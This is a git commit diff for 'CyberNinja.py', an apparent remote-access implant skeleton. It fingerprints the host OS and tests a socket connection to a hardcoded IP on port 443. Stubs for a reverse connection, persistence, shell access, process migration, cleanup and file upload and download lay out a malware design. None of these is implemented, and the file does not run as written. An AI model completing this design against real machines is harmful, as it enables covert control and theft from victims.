b3bf40f66e9dd40b059c51a87ecb2947916399b9
Andrew.Melsom <andrew.melsom@gmail.com>
2018-07-05 13:16:06 +0100

    Worked on Script

--- CyberNinja.py
+++ CyberNinja.py
@@ -1,39 +1,62 @@
-os = []
-osversion = []
+import platform
+import socket
+
+
 portstotest = []
-remoteserver = []
-remoteserverport = []
 persistent = []
 
 
+class OperatingSysetm(object):
+    os = ""
+    osversion = ""
+    osrelease = ""
+    artictecture = ""
+
+
+class ServerConnection(object):
+    remoteserver = "5.134.12.203"
+    remoteserverport = 443
+
+
 def getosinfo():
+    try:
+        OperatingSysetm.os = platform.system()
+        OperatingSysetm.osrelease = platform.release()
+        OperatingSysetm.osversion = platform.version()
+        OperatingSysetm.artictecture = platform.machine()
+    except Exception as e:
+        print(e)
+    return OperatingSysetm
 
 
 def testconectivity():
+    s = socket.socket()
+    try:
+        s.connect((ServerConnection.remoteserver, ServerConnection.remoteserverport))
+        return True
+    except Exception as e:
+        print(e)
+    finally:
+        s.close()
 
 
 def reverseconnection():
+#
+#
+
+if __name__ == '__main__':
+    myos = getosinfo()
+    test = testconectivity()
 
 
-def setpersistent():
-
-
-def getshell():
-
-
-def enumos():
-
-
-def migrateprocess():
-
-
-def cleanup():
-
-
-def upload():
-
-
-def download():
+# def reverseconnection():
+# def setpersistent():
+# def getshell():
+# def enumos():
+# def migrateprocess():
+# def cleanup():
+# def upload():
+# def download():
 
 
 
